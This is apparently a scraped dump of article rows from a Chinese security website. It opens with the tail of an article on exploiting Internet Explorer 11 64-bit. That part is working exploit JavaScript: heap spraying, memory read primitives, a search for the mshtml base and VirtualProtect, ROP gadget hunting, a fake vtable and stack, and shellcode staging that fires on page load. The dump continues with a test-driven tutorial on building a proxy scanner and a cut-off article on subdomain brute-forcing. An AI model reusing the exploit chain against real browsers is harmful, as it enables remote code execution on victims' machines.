bugfunction crash(i) { numsploits = numsploits + 1; t = document.getElementsByTagName(""table"")[i]; t.parentNode.runtimeStyle.posWidth = -1; t.focus(); setTimeout(cont, 100);  }//heap sprayfunction spray() { var aa = ""aa""; //create a bunch of String and Array objects for(var i=0;i&lt;50000;i++) {   strarr[i] = aa.toUpperCase();   arrarr[i] = new Array(1,2,3,4,5); } //heap-spray with pointers to a String object for(var i=0;i&lt;2000;i++) {   var tmparr = new Array(16000);   for(var j=0;j&lt;16000;j++) {     tmparr[j] = strarr[magic];   }   sprayarr[i] = tmparr; } crash(0);}function cont() { if(numsploits &lt; 5) {   crash(numsploits);   return; } if(numsploits &lt; 6) {   setTimeout(afterFirstOverwrite, 0);   return; } //alert(""done2""); afterSecondOverwrite();}function afterFirstOverwrite() { //check which array was overwritten for(var i=24000;i&lt;25000;i++) {   arrarr[i][18] = 1;   var a = arrarr[i][4];   var b = arrarr[i][16];   var c = arrarr[i][17];   if(typeof(b)!=""undefined"") {     arrindex = i;     addrlo = b;     addrhi = c;     break;   } } if(arrindex &lt; 0) {   alert(""Exploit failed, error overwriting array"");   return; } //alert(arrindex); //re-spray to overwrite buffer capacity for(var i=0;i&lt;2000;i++) {   sprayarr[i] = new Array(32000); } CollectGarbage(); for(var i=0;i&lt;2000;i++) {   for(var j=0;j&lt;32000;j++) {     if(j%2 == 0) {       sprayarr[i][j] = addrlo + 8 - 0xBF4 + 3;     } else {       sprayarr[i][j] = addrhi;     }   } } //alert(""done""); crash(numsploits);}//unsigned to signed conversionfunction u2s(i) { if(i&gt;0x80000000) {   return -(0xFFFFFFFF - i + 1); } else {   return i; }}//signed to unsigned conversionfunction s2u(i) { if(i&lt;0) {   return (0xFFFFFFFF + i + 1); } else {   return i; }}//memory disclosure helper function, read 32-bit number from a given addressfunction read32(addrhi, addrlo) { arrarr[arrindex][strobjidx + 6] = u2s(addrlo); arrarr[arrindex][strobjidx + 7] = addrhi; return strarr[strindex].charCodeAt(0) + 0x10000 * strarr[strindex].charCodeAt(1);}//memory disclosure helper function, read 16-bit number from a given addressfunction read16(addrhi, addrlo) { arrarr[arrindex][strobjidx + 6] = u2s(addrlo); arrarr[arrindex][strobjidx + 7] = addrhi; return strarr[strindex].charCodeAt(0);}function afterSecondOverwrite() { arrindex = arrindex + 1; //adjusts the array length - gives us some space to read and write memory arrarr[arrindex][2+0x5000/4] = 0; //search for the next string object and overwrite its length and content ptr to write jscript9 for(var i=1;i&lt;=5;i++) {   if((arrarr[arrindex][2 + i*0x400 - 0x20] == 2) &amp;&amp; (arrarr[arrindex][3 + i*0x400 - 0x20] == 0)) {     //alert(""found"");     strobjidx = i*0x400 - 0x20 - 2;     arrarr[arrindex][strobjidx+4] = 4;     for(var j=20000;j&lt;30000;j++) {       if(strarr[j].length != 2) {         strindex = j;         break;       }     }     break;   } } if(strindex &lt; 0) {   alert(""Exploit failed, couldn't overwrite string length"");   return; } //alert(""mshtml""); //create a mshtml object and follow references to its vtable ptr var lo1,hi1,lo2,hi2; arrarr[arrindex+1][0] = document.createElement(""button""); lo1 = s2u(arrarr[arrindex][6+0x28/4]); hi1 = arrarr[arrindex][6+0x28/4 + 1]; lo2 = read32(hi1, lo1+0x18); hi2 = read32(hi1, lo1+0x18+4); mshtmllo = read32(hi2, lo2+0x20); mshtmlhi = read32(hi2, lo2+0x20+4); //find the module base mshtmllo = mshtmllo - mshtmllo % 0x1000; while(mshtmllo&gt;0) {   if(read16(mshtmlhi,mshtmllo) == 0x5A4D) break;   mshtmllo = mshtmllo - 0x1000; } //find the address of VirtualProtect in the IAT var coff = read32(mshtmlhi, mshtmllo + 0x3C); var idata = read32(mshtmlhi, mshtmllo + coff + 4 + 20 + 120); var iat = read32(mshtmlhi, mshtmllo + idata + 16); var vplo =  read32(mshtmlhi, mshtmllo + iat + 0x8a8); var vphi =  read32(mshtmlhi, mshtmllo + iat + 0x8a8 + 4); //alert(mshtmlhi.toString(16)+""'""+mshtmllo.toString(16)+"",""+vplo.toString(16)); //find the rop gadgets in mshtml var pivotlo = -1; arrarr[arrindex][strobjidx + 4] = 0x01000000; arrarr[arrindex][strobjidx + 6] = u2s(mshtmllo); arrarr[arrindex][strobjidx + 7] = mshtmlhi; for(var i=0x800;i&lt;0x900000;i++) {   if((strarr[strindex].charCodeAt(i) == 0x5C50)     &amp;&amp;(strarr[strindex].charCodeAt(i+1) == 0xD285)     &amp;&amp;(strarr[strindex].charCodeAt(i+2) == 0x0874)     &amp;&amp;(strarr[strindex].charCodeAt(i+3) == 0x408b))   {     pivotlo = mshtmllo + i*2;     break;   }   if((strarr[strindex].charCodeAt(i) == 0x508B)     &amp;&amp;(strarr[strindex].charCodeAt(i+1) == 0x855C)     &amp;&amp;(strarr[strindex].charCodeAt(i+2) == 0x74D2)     &amp;&amp;(strarr[strindex].charCodeAt(i+3) == 0x8b08))   {     pivotlo = mshtmllo + i*2 + 1;     break;   } } if(pivotlo &lt; 0) {   alert(""Exploit failed, couldn't find ROP gadgets"");   return; } //alert(pivotlo.toString(16)); var poprcx = -1; for(var i=0x800;i&lt;0x900000;i++) {   if(strarr[strindex].charCodeAt(i) == 0xC359) {     poprcx = mshtmllo + i*2;     break;   } } if(poprcx &lt; 0) {   alert(""Exploit failed, couldn't find ROP gadgets"");   return; } var poprdx = -1; for(var i=0x800;i&lt;0x900000;i++) {   if(strarr[strindex].charCodeAt(i) == 0xC35A) {     poprdx = mshtmllo + i*2;     break;   } } if(poprdx &lt; 0) {   alert(""Exploit failed, couldn't find ROP gadgets"");   return; } var popr8 = -1; for(var i=0x800;i&lt;0x900000;i++) {   if((strarr[strindex].charCodeAt(i) == 0x5841) &amp;&amp; (strarr[strindex].charCodeAt(i+1) % 256 == 0xC3)) {     popr8 = mshtmllo + i*2;     break;   }   if((Math.floor(strarr[strindex].charCodeAt(i)/256) == 0x41) &amp;&amp; (strarr[strindex].charCodeAt(i+1) == 0xC358)) {     popr8 = mshtmllo + i*2 + 1;     break;   } } if(popr8 &lt; 0) {   alert(""Exploit failed, couldn't find ROP gadgets"");   return; } //prepare the fake vtable var eaxoffset = 6 + 0x20; arrarr[arrindex][eaxoffset + 0x98/4] = u2s(pivotlo); arrarr[arrindex][eaxoffset + 0x98/4 + 1] = mshtmlhi; //prepare the fake stack arrarr[arrindex][eaxoffset] = u2s(poprcx); arrarr[arrindex][eaxoffset + 1] = mshtmlhi; arrarr[arrindex][eaxoffset + 2] = addrlo; arrarr[arrindex][eaxoffset + 3] = addrhi; arrarr[arrindex][eaxoffset + 4] = u2s(poprdx); arrarr[arrindex][eaxoffset + 5] = mshtmlhi; arrarr[arrindex][eaxoffset + 6] = 0x1000; arrarr[arrindex][eaxoffset + 7] = 0; arrarr[arrindex][eaxoffset + 8] = u2s(popr8); arrarr[arrindex][eaxoffset + 9] = mshtmlhi; arrarr[arrindex][eaxoffset + 10] = 0x40; arrarr[arrindex][eaxoffset + 11] = 0; arrarr[arrindex][eaxoffset + 12] = u2s(vplo); arrarr[arrindex][eaxoffset + 13] = u2s(vphi); arrarr[arrindex][eaxoffset + 14] = addrlo + 24 + eaxoffset*4 + 50*4; arrarr[arrindex][eaxoffset + 15] = addrhi; //encode the shellcode for(var i=0;i&lt;Math.floor(shellcode.length/4);i++) {    arrarr[arrindex][eaxoffset + 50 + i] = u2s(shellcode[i*4+3]*0x1000000 + shellcode[i*4+2]*0x10000 + shellcode[i*4+1]*0x100 + shellcode[i*4]); } //overwrite a vtable of jscript9 object and trigger a virtual call arrarr[arrindex][7] = addrhi; arrarr[arrindex][6] = addrlo + 24 + eaxoffset*4; //arrarr[arrindex][7] = 0x123456; //arrarr[arrindex][6] = 0x123456; //alert(""done3""); arrarr[arrindex+1].blah();}function run() { numsploits = 0; window.setTimeout(spray, 1000);}&lt;/script&gt;&lt;body onload=run()&gt;&lt;form&gt;&lt;table&gt;&lt;th&gt;&lt;ins&gt;aaaaaaaaaa aaaaaaaaaa&lt;/ins&gt;&lt;/th&gt;&lt;/table&gt;&lt;/form&gt;&lt;form&gt;&lt;table&gt;&lt;th&gt;&lt;ins&gt;aaaaaaaaaa aaaaaaaaaa&lt;/ins&gt;&lt;/th&gt;&lt;/table&gt;&lt;/form&gt;&lt;form&gt;&lt;table&gt;&lt;th&gt;&lt;ins&gt;aaaaaaaaaa aaaaaaaaaa&lt;/ins&gt;&lt;/th&gt;&lt;/table&gt;&lt;/form&gt;&lt;form&gt;&lt;table&gt;&lt;th&gt;&lt;ins&gt;aaaaaaaaaa aaaaaaaaaa&lt;/ins&gt;&lt;/th&gt;&lt;/table&gt;&lt;/form&gt;&lt;form&gt;&lt;table&gt;&lt;th&gt;&lt;ins&gt;aaaaaaaaaa aaaaaaaaaa&lt;/ins&gt;&lt;/th&gt;&lt;/table&gt;&lt;/form&gt;&lt;form&gt;&lt;table&gt;&lt;th&gt;&lt;ins&gt;aaaaaaaaaa aaaaaaaaaa&lt;/ins&gt;&lt;/th&gt;&lt;/table&gt;&lt;/form&gt;&lt;/body&gt;","2016-11-22 13:30:49","Web安全","Exploiting Internet Explorer 11 64-bit on Windows 8.1 Preview","http://nsoad.com/Article/web/20161122/832.html"
"5ccbfa624f2f0a0a7a69c059","之前在 Freebuf 的文章“关于渗透测试工具开发架构探讨”，读者有提出，具体应该怎么写呢？第一步做什么？第二步做什么？","kong","前言之前在 Freebuf 的文章“关于渗透测试工具开发架构探讨”，读者有提出，具体应该怎么写呢？第一步做什么？第二步做什么？现在我觉得自己有一些体会了，也自己觉得自己还是有把握把这个事情解释清楚的，那么我就来写一些东西，来讲一下我很喜欢的一种敏捷开发方法： TDD。 什么是 TDD 以及 我为什么推荐 TDD做过一些软件开发的朋友们可能会知道这个东西 TDD(Test-Driven Development)，诚然我自己之前的开发也并不是 TDD，而是传统的开发，写文档，开发，写文档的“瀑布”开发。当然自己也是开始尝试进行一些系统的 Web 开发训练的时候深深体会到了 TDD 开发的优势，想到了 Freebuf 这边还有一个坑没填，那就来结合现在的经验谈一下这个事情吧！Test-Driven Development 顾名思义，就是利用测试来驱动(督促)开发进展中文名也就是测试驱动开发，简称 TDD。是一种敏捷开发模式。当然这么说大家会觉得非常抽象。那我就通俗的来解释一下，可能有不恰当的地方，希望读者在评论区指出：众所周知瀑布式开发一般来说写代码-写文档-写代码-写文档-… 。每一个周期与周期之间唯一的衔接就是文档；但是 TDD 是测试驱动的，就是先有测试用例 (testCase)，然后再有代码（听起来是不是非常的奇怪），其实想想非常的常见，不就是现有需求后代码么？没错啊，TDD 可以说是把这个大需求，直接反映在测试上，然后根据测试用例来开发代码，写出满足测试用例的最少的代码。   优势这样做有什么好处呢？时刻检查自己的代码是不是符合自己的目标，如果符合要求可以通过，如果不符合，则不能通过。除此之外，仔细想想，在未完成开发的时候，你可以随时停下你的开发，下次只需要运行测试用例，查看哪里没有通过，就可以继续之前的代码进行开发。当然，这只是其中的两条显而易见的好处。  缺点理所当然的，作为一个渗透测试人员，需要一些短平快的脚本的时候，是根本不需要使用 TDD 方法去写代码的，显然啊，TDD 方法开发的代码量其实要比原来的开发要大（主要体现在有时候需要写大量的测试代码），这算是 TDD 一个缺点。不过按照我个人的体验来说，TDD 方法去开发工具的时候，效率不止是提高了一点，就算写了大量的测试代码，但是仍然是效率高于原来。  渗透工具（HTTP 代理扫描）从 0 开始：提到 HTTP 代理大家都还是挺熟悉的。那么既然要学习渗透工具开发，不妨就来做一个这样的实用的小玩意。在学习 Python 之余坚持完成了，还可以平时自己使用一波，还是挺不错的。那么关于 HTTP 代理呢？大家应该都并不是特别陌生，我们经常会使用到 HTTP/HTTPS 代理去完成隐藏自己的真实 IP(隐藏自己真实信息这个的可行性我们暂且不谈)，那么大家会发现，我们经常上网寻找一些公开的代理网站，(比如快代理啊，xici之类的)开发环境与重要模块1. Python2.7+2. Pylint  用于检查代码规范3. unittest  用于 TDD 测试驱动开发说实话，基本 Python 基础知识和 unittest 的基本使用方法我就不介绍了，如果你在阅读这篇文章，就说明你至少还有有一些 Python 基础的。  哦，除此之外，建议在写代码的时候使用 Google 开源项目代码规范 (Python)  。0×00 Start Up！（嗨呀，首先是不是要写 Hello World 啊？）当然，既然我们想要使用 TDD 的方法来开发，我们首先当然需要写一个测试用例。（暂且撇开测试套件什么的，我们就最简单的做一个测试用例）。那么要写测试用例了，我们首先得知道，我们想要做出的功能是怎么样的？嗯…既然是代理扫描器嘛，首先我们得知道怎么去扫描 HTTP 代理，其实并不用说的太玄乎，有个最简单的办法就是，我们就去把它当代理用，如果成功了，那么就说明这个 IP 的端口开启了代理模式，如果失败了，那就说明这个端口并不能作为代理来使用。那么事情就简单了，我们想要的第一个功能就是使用 Python 完成检测目标 IP:PORT 是否是可用代理。那么就动手吧！当然我们需要先建立一个文件，根据功能，就叫 check_proxy.py 吧！在新建文件之后，我们需要开始编写测试用例了。（什么？为什么不是编写代码？）毕竟我们尝试的是 TDD 方法开发工具，显然首先写个函数什么的显然并不是符合我们的初衷。那么，我们就开始吧！  #!/usr/bin/env python#coding:utf-8""""""  Author:   --&lt;VillanCH&gt;  Purpose: check proxy available  Created: 2016/10/31""""""import unittest########################################################################class CheckProxyTest(unittest.case.TestCase):    """"""Test CheckProxy""""""    passif __name__ == '__main__':    unittest.main()在创建了这个段代码之后，显然，大家看到我 import unittest 应该就知道接下来要编写测试用例了吧。那么 unittest 应该怎么使用我觉得我不用向大家解释太多，直接看代码更加直观。在有了测试文件类之后呢，我们并不着急编写我们的 CheckProxy 的功能代码。我们不妨设想一下我们这个类的功能：姑且就是我们输入一个 IP:PORT 这个形式，运行模块，如果可以用作代理，返回结果表明这个地址可以用作 HTTP 还是 HTTPS 代理，那么我们就规定一下返回的格式吧： {    'result':True,    'proxy':{        'http':'xxx.xxx.xxx.xx:port',        'https':'xxx.xxx.xxx.xx:port'    }}如果没有 HTTPS 代理的功能的话那就是： {    'result':True,    'proxy':{        'http':'xxx.xxx.xxx.xx:port',    }}当然这是理想情况，如果不是代理呢？{    'result':False,    'proxy':None}嗯这样的话，我们就可以根据这个来写第一个测试用例了：我们删除 pass 然后添加 def test_xxxxx 方法：  def test_check_ip(self):    '''    result should be    {        'result':True,        'proxy':{            'http':'xxx.xxx.xxx.xx:port',         'https':'xxx.xxx.xxx.xx:port'        }    }    '''    #创建想要测试的实例    master = CheckProxy('78.6.5.45:8080')    result = master.test()    ##对结果进行测试    #测试结果必须是个 dict 类型    self.assertIsInstance(result, dict)    #必须有一个 result 和 proxy 的键    self.assertTrue(result.has_key('result'))    self.assertTrue(result.has_key('proxy'))    #result 键对应的值必须是一个 bool 类型    self.assertIsInstance(result['result'], bool)            #断言测试 result['proxy'] 的类型    if result['result']:        self.assertIsInstance(result['proxy'], dict)    else:        self.assertIsNone(result['proxy'])  0×01 测试与修改显然我们看到我们的测试代码，如果能跑通的话，也就一定是我们想要的结果了（至少接口是符合我们需求的）。那么我们切换到命令行来执行这个测试用例。  E======================================================================ERROR: test_check_ip (__main__.CheckProxyTest)----------------------------------------------------------------------Traceback (most recent call last):  File ""check_proxy.py"", line 26, in test_check_ip    master = CheckProxy('78.6.5.45:8080')NameError: global name 'CheckProxy' is not defined----------------------------------------------------------------------Ran 1 test in 0.000sFAILED (errors=1)  显然不用过多解释大家也知道这个是失败了，原因是什么呢？我们根本没有建立 CheckProxy 方法或者 CheckProxy 类啊，当然会失败，那么我们看到 Traceback 中告诉我们 CheckProxy 没有定义，那么我们肯定要去先解决这第一个问题了吧。 所以我们新建我们的类：  class CheckProxy(object):    """"""Check Proxy    Attributes:        target: A str, the target you want to check.                 Example: 44.4.4.4:44""""""    #----------------------------------------------------------------------    def __init__(self, target):        """"""Constructor""""""        self.target = target然后我们再来测试我们的代码 python check_proxy.py：  E======================================================================ERROR: test_check_ip (__main__.CheckProxyTest)----------------------------------------------------------------------Traceback (most recent call last):  File ""check_proxy.py"", line 43, in test_check_ip    result = master.test()AttributeError: 'CheckProxy' object has no attribute 'test'----------------------------------------------------------------------Ran 1 test in 0.000sFAILED (errors=1)****  显然又失败了，原因当然 unittest 他已经告诉我们了： 没有一个叫 test 的参数，当然啊我们毕竟之写了 CheckProxy 的构造器，我们并没有创建一个叫 test 的方法。所以我们又需要修改我们的代码… 我觉得到现在了，读者应该觉得挺累的也挺无聊的，不就是这个小东西么？我分分钟写出来啊。而且并不用写这么烦人的测试代码，而且很蠢的一次一次去测试。事实上我在实际做的时候也不会这么蠢，这么慢去写，当然熟练的话，可以根据测试用例直接写出符合规范的代码。嗯，确实是这样。但是既然是刚开始学习这项新的 “技术” 为了领会思想，还是乖乖照做吧。  0×02 第一次测试成功经过上面各种各样循环，我们终于测试成功了，当然下面的代码可能并不是特别光荣。哈哈 但是至少我们知道成功是什么滋味了对吧？  .----------------------------------------------------------------------Ran 1 test in 0.000sOK  我们的代码现在是什么样子呢？  class CheckProxy(object):    """"""Check Proxy    Attributes:        target: A str, the target you want to check.                 Example: 44.4.4.4:44""""""    #----------------------------------------------------------------------    def __init__(self, target):        """"""Constructor""""""        self.target = target    def test(self):        '''Test the self.target whether is a http proxy addr        Returns:            A dict: if the result is True:            Example:              {                  'result':True,                  'proxy':{                      'http':'xxx.xxx.xxx.xx:port',                      'https':'xxx.xxx.xxx.xx:port'                   }              }            if the target isn' t the http proxy addr,             the result['proxy'] will be None         '''        result = {}        result['result'] = False        result['proxy'] = None        return result什么嘛！你这明明是欺骗 unittest 获得的通过测试，一点都不诚实。为什么这么做呢？简单来说我们先保证接口是统一的，然后再对细节进行一些填充，可以很理所当然的增加新的测试用例，完成更加强大的功能。因为很有可能我们不让这个测试通过的话，会干扰我们后面很多选择，让我们觉得，这个 CheckProxy 的每一个功能似乎都与 test 有关，实际上啊，我们第一个测试用例是在测试接口啊。所以大胆放心吧，我们后面当然会完善。  当然，我们先尽量让它通过，然后在来继续写一些测试用例来完成细节，那么我们可以开始下一个测试用例了。  0×03 正式开始了！之前的算是熟悉我们需要用到的方法了，接下来我们要做的，肯定就是完成这个测试用例的功能了吧~那么接下来怎么做呢？继续完善 CheckProxy.test() 方法还是？当然我们要继续补充我们的测试用例啊。那么问题就来了，我们如果想验证我们的代理检测工具是不是可以正常工作，我们当然需要找到一个可以使用的匿名代理对不对？那么这些东西我们去哪里找呢？当然，笔者自然不会打没有准备的仗，哈~其实这次讲的这个工具，是我之间就做过的一个代理搜集(扫描工具)，当时做的有不成熟的地方，那么现在就准备重构一下，带领大家过一遍一个工具的开发流程。所以公开的代理，我就不用满大街去寻找了，就随便从我的旧版的 pr0xy 中寻找一些出来吧。  Pr0xy-shell # proxy showproxy      : {u'http': u'http://120.52.72.23:80'}check_time : Wed Aug 03 23:31:44 2016proxy      : {u'http': u'http://103.27.24.238:80'}check_time : Wed Aug 03 23:31:44 2016proxy      : {u'http': u'http://50.31.252.54:8080', u'https': u'https://50.31.252.54:8080'}check_time : Wed Aug 03 23:31:44 2016proxy      : {u'http': u'http://82.196.10.29:80', u'https': u'https://82.196.10.29:80'}check_time : Wed Aug 03 23:31:44 2016proxy      : {u'http': u'http://119.188.94.145:80', u'https': proxy      : {u'http': u'http://108.59.10.129:55555', u'https': u'https://108.59.10.129:55555'}check_time : Wed Aug 03 23:31:44 2016proxy      : {u'http': u'http://14.161.21.170:8080', u'https': u'https://14.161.21.170:8080'}check_time : Wed Aug 03 23:31:44 2016proxy      : {u'http': u'http://179.242.95.20:8080'}  当然笔者对上面的代理不保证永久的可用性，以上代理收集途径均为公共代理。很有可能在大家看到这篇文章的时候，上面代理已经没剩下几个活着的了。自然我也是有办法验证自己的 IP 是不是被很好的隐藏了，我们平时怎么做的呢？就是打开百度，输入 IP：那么如果成功了的话大家看到红色箭头了么？我们想要在程序中使用这项功能，不妨可以去 ip138 中寻找一下接口看能不能使用~所以经过一番查找，我们发现了接口是 http://1212.ip138.com/ic.asp, 至于这个网站是干什么的不妨大家自己去看一下。一切顺利，于是我们先添加测试代码吧！  def test_ip_check_function(self):    #首先测试一个正确的实例（已知一定是个代理）    addr = '108.59.10.129:55555'    master = CheckProxy(target=addr)    result = master.test()    #在前一个例子中我们验证了接口    #那么在这里我们只需要验证一下    #一定是完成了代理检测的，而且成功了    proxy = result['proxy']    self.assertTrue(proxy.has_key('http'))没错我们新添加这么一点东西，运行一下看一下结果 (不用说，肯定会出错的，但是我们先看一下在说):.E======================================================================ERROR: test_ip_check_function (__main__.CheckProxyTest)----------------------------------------------------------------------Traceback (most recent call last):  File ""check_proxy.py"", line 92, in test_ip_check_function    self.assertTrue(proxy.has_key('http'))AttributeError: 'NoneType' object has no attribute 'has_key'----------------------------------------------------------------------Ran 2 tests in 0.001s我们看到了，断言错误了：这是当然嘛我们还没有做检测呢，那么，我们接下来要去完善 CheckProxy.test() 这里的方法了。  #----------------------------------------------------------------------   def test(self):    '''Test the self.target whether is a http proxy addr    Returns:        A dict: if the result is True:        Example:          {              'result':True,              'proxy':{                  'http':'xxx.xxx.xxx.xx:port',                  'https':'xxx.xxx.xxx.xx:port'               }          }        if the target isn' t the http proxy addr,         the result['proxy'] will be None     '''    result = {}    result['result'] = False    result['proxy'] = self._check_ip()    return result#----------------------------------------------------------------------def _check_ip(self):    """"""Check IP return the proxy or None    Returns:        A dict or None: if the result is True(the addr can be a proxy)            the result is the dict like {'http':'http://xx.xx.xx.xx:xx',                                         'https':'https://xx.xx.xx.xx:xx'}            And if the https proxy can't be used the key named 'https',            Well, if the result is False(the addr can't be used as a proxy)            the result is None""""""    check_ip_http = 'http://1212.ip138.com/ic.asp'    check_ip_https = 'https://1212.ip138.com/ic.asp'    addr_proxy = {}    addr_proxy['http'] = 'http://' + self.target    addr_proxy['https'] = 'https://' + self.target    result = {}    http_rsp = requests.get(check_ip_http, proxies=addr_proxy, timeout=5)    if self.target in http_rsp.text:        result['http'] = 'http://' + self.target    https_rsp = requests.get(check_ip_https, proxies=addr_proxy,                             verified=False, timeout=5) # close https verify    if self.target in https_rsp.text:        result['https'] = 'https://' + self.target    if result.has_key('http') or result.has_key('https'):        return result    else:        return None这样写出来的代码实际上还是非常漂亮的对吧？基本符合 Google 开源 Python 规范，尝试一下 PylintC:\xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx&gt;pylint check_proxy.pyNo config file found, using default configuration************* Module pr0xy.lib.check_proxyC: 15, 0: Trailing whitespace (trailing-whitespace)C: 17, 0: Trailing whitespace (trailing-whitespace)C: 24, 0: Trailing whitespace (trailing-whitespace)C: 25, 0: Trailing whitespace (trailing-whitespace)...............Messages--------+-----------------------+------------+|message id             |occurrences |+=======================+============+|trailing-whitespace    |10          |+-----------------------+------------+|too-few-public-methods |1           |+-----------------------+------------+Global evaluation-----------------Your code has been rated at 7.56/10 (previous run: 7.56/10, +0.00)大致看了一下 trailing-whitespace 指的是结尾无意义的空格，too-few-public-methods 指的是公共方法太少了，实际上无意义空格这个是我的 IDE 导致的，应该在 IDE 的 preferences 中可以设置改掉的，嗨呀可是这导致扣了好多分，只能打 7.56 分，笔者好懒啊~来运行一下测试用例EE======================================================================ERROR: test_check_ip (__main__.CheckProxyTest)----------------------------------------------------------------------Traceback (most recent call last):  File ""check_proxy.py"", line 100, in test_check_ip    result = master.test()...ConnectTimeoutError(&lt;requests.packages.urllib3.connection.HTTPConnection object at 0x000000000333BB00&gt;, 'Connection to 78.6.5.45 timed out. (connect timeout=5)'))======================================================================ERROR: test_ip_check_function (__main__.CheckProxyTest)test function----------------------------------------------------------------------Traceback (most recent call last):  File ""check_proxy.py"", line 121, in test_ip_check_function...object at 0x00000000033C90B8&gt;, 'Connection to 108.59.10.129 timed out. (connect timeout=5)'))----------------------------------------------------------------------Ran 2 tests in 10.032sFAILED (errors=2)太惨了，全失败，自己看一下原因，好像都是因为 timeout, 那么，我们就去处理一下异常好了，顺便再看一下，好像需要调整一下 timeout 的时间，那么我们就顺手改一下 testCase 什么的。  .E======================================================================ERROR: test_ip_check_function (__main__.CheckProxyTest)test function----------------------------------------------------------------------Traceback (most recent call last):  File ""check_proxy.py"", line 136, in test_ip_check_function    self.assertTrue(proxy.has_key('http'))AttributeError: 'NoneType' object has no attribute 'has_key'----------------------------------------------------------------------Ran 2 tests in 12.039sFAILED (errors=1)好像又不能通过了，看下错误，别慌张，我们仔细看一下这个错误的原因，这显然就是这个代理已经失效了，所以我们换个能用的代理，总之通过就好了~最后我们测试通过，这是现在的 check_ip 代码def _check_ip(self, timeout):    """"""Check IP return the proxy or None    Returns:        A dict or None: if the result is True(the addr can be a proxy)            the result is the dict like {'http':'http://xx.xx.xx.xx:xx',                                         'https':'https://xx.xx.xx.xx:xx'}            And if the https proxy can't be used the key named 'https',            Well, if the result is False(the addr can't be used as a proxy)            the result is None""""""    headers = {}    headers['User-Agent'] = 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36'    check_ip_http = 'http://1212.ip138.com/ic.asp'    check_ip_https = 'https://1212.ip138.com/ic.asp'    addr_proxy = {}    addr_proxy['http'] = 'http://' + self.target    addr_proxy['https'] = 'https://' + self.target    result = {}    http_rsp = ''    try:        http_rsp = requests.get(check_ip_http, proxies=addr_proxy, timeout=timeout,                                headers=headers).text    except:        pass    if self.ip in http_rsp:        result['http'] = 'http://' + self.target    https_rsp = ''    try:        https_rsp = requests.get(check_ip_https, proxies=addr_proxy,                                 verify=False, timeout=timeout,                                 headers=headers).text # close https verify    except:        pass    if self.ip in https_rsp:        result['https'] = 'https://' + self.target    if result.has_key('http') or result.has_key('https'):        return result    else:        return None大家看 已经要比原来的代码看起来美观很多了是不是？下面是我们的测试结果：C:\xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx&gt;python check_proxy.py..----------------------------------------------------------------------Ran 2 tests in 6.030sOK可是适当修改测试用例，添加一些说明：  API testAPI test success!.function testfunction test success!.----------------------------------------------------------------------Ran 2 tests in 7.545sOK当然 看到最后的测试成功，大家还是有很多细节需要改动的，那么经过轮番的测试，修改循环，我的这个检测模块已经感觉不错了，至少现在是满足我们所有的东西了。 具体的代码呢，可以见 github 地址。  0×04 接下来？那么收工之后呢，既然我们要做代理扫描器，针对单个的 IP:PORT 的地址进行代理检测已经完成了，那么我们接下来要考虑的事情，就是，提供一个大的 IP 段，然后可以对这个 IP 段中的 IP 进行代理检测，然后再把结果汇总，看起来很简单么？是吧！其实并不是这样的，我们要考虑的问题还有特别多，比如：并发我们怎么处理？我们如何筛选高质量的 IP 段？（至少我们得知道国外和国内的 IP 段不同对吧？）我们扫描到的代理，如何使用？还有，直接扫描太慢了，有更快的方法么？当然，上面的问题，我们在后面解决，包括针对渗透测试 Python 编程的各种细节，我都会在后面讲给大家，希望对大家有帮助~总结：当然今天讲了看起来很多的东西，其实也并没有多少，同样大多东西需要读者亲手去做了才会有体会。那么我反过来再来说一下之前有读者问到的问题：真正要开始写一个工具的时候，第一步或者说第一行代码应该是什么呢？那么现在，大家应该懂了吧，从测试用例开始一个功能模块一个功能模块开始写。当然如果想要详细了解 TDD 这种开发思想的话，你可以去看一下《Python Web开发：测试驱动方法》这本书，很详细的讲了 TDD 的开发思想，当然我只是把他用在了渗透工具的开发上了。那么当然，这一篇文章显然还没有结束，关于 Python 编程的一大堆东西，准备在下一篇文章中分享给大家。笔者水平有限，希望能对大家有所帮助。  所有代码地址：GITHUB 地址: https://github.com/VillanCh/pr0xy","2016-12-09 11:06:24","安全工具","TDD 方法开发渗透测试工具：代理扫描器（第一集）","http://nsoad.com/Security-tools/20161209/tools-903.html"
"5ccbfa624f2f0a0a7a69c05a","个人认为信息收集是渗透测试中最重要的部分，它将直接影响到渗透测试的结果。今天给大家分享的是信息收集中的一小部分，域名爆破。","Chora","前言个人认为信息收集是渗透测试中最重要的部分，它将直接影响到渗透测试的结果。今天给大家分享的是信息收集中的一小部分，域名爆破。域名爆破的重要性域名爆破能够发现一些在公开信息里搜索不到的域名；有的域名可能直接绑定的内网地址，有利于一些漏洞的延伸，比如SSRF漏洞很多小型网站的后台是很多都在主域名的某个目录下面者三级域名下，而很多大型网站的后台都是在二级、三级及以下域名下，甚至有可能在这些域名的目录下。爆破原理爆破的原理其实是通过枚举域名的A记录的方式来实现的泛解析如何爆破首先的访问一个随机并不存在的域名chorashishuaige.xx.com，记录其泛解析到的IP地址。然后通过字典或者自定义规则的方式枚举域名的A记录，并与最开始的chorashishuaige.xx.com的A记录做对比，不同的则是存在的域名，也就是在用的域名。如何防御并没有真正意义上的防御方案，只能说增大域名爆破的难度。可以使用泛解析配合DNS轮询的方式，即访问一个随机不存在的域名chorashishuaige.xx.com会得到一组IP，访问另一个不存在的域名又会得到另外一组IP，这样就会给域名爆破工具带来误报，当然域名爆破工具完全可以先多次枚举随机域名，将得到的IP组保存在集合里，然后再进行对比，如果枚举到的域名A记录不在该集合里，则是存在的域名，也就是在用的域名。特色有的厂商喜欢使用mxxx.xx.com有的厂商喜欢使用xxx-o2o.xx.com，这个时候想要提高爆破效率，就可以使用{fuzz}代替xxx，即{fuzz}xxx.xx.com或者{fuzz}-o2o.xx.com的方式来在指定位置进行爆破比如有一个6级域名test.m.esf.db.house.xx.com，如果不支持循环遍历，则需要先爆破xx.com，爆破出house.xx.com再爆破db.house.xx.com依此类推爆破到test.m.esf.db.house.xx.com，每一步都需要手动来爆破，效率太低了这个时候如果支持循环爆破，只需要填入xx.com，就会自动遍历到指定层次，或者遍历到没有域名为止。大量的DNS请求会造成网络卡顿，特别是挂机循环爆破几天的情况下可能会影响到同事的网络，这个时候可以先暂停等后续再进行爆破。使用方法可以导入自己的字典进行爆破，也可以自己定义规则进行爆破。层次选项即为要遍历多少层的意思，比如从xx.com开始遍历，遍历到test.m.esf.db.house.xx.com为5层，当然不需要人进行计算，那样就太麻烦